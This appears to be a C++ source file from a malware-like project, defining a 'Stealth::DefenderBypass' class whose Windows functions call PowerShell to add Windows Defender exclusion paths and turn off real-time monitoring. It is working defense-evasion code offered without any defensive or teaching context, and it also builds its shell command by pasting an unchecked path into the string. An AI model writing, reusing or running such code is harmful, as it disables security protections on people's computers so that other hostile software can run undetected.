#include "../../include/stealth/defender_bypass.h"
#include <cstdlib>

#ifdef _WIN32
#include <windows.h>
#include <atomic>
#include <cstdint>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <functional>
#include <stdexcept>
#include <map>

#endif

namespace Stealth {

bool DefenderBypass::add_exclusion(const std::string &path) {
#ifdef _WIN32
  std::string cmd =
      "powershell -Command \"Add-MpPreference -ExclusionPath '" + path + "'\"";
  return system(cmd.c_str()) == 0;
#else
  return false;
#endif
}

bool DefenderBypass::disable_realtime_monitoring() {
#ifdef _WIN32
  std::string cmd = "powershell -Command \"Set-MpPreference "
                    "-DisableRealtimeMonitoring $true\"";
  return system(cmd.c_str()) == 0;
#else
  return false;
#endif
}

bool DefenderBypass::add_to_whitelist() { return false; }

} // namespace Stealth
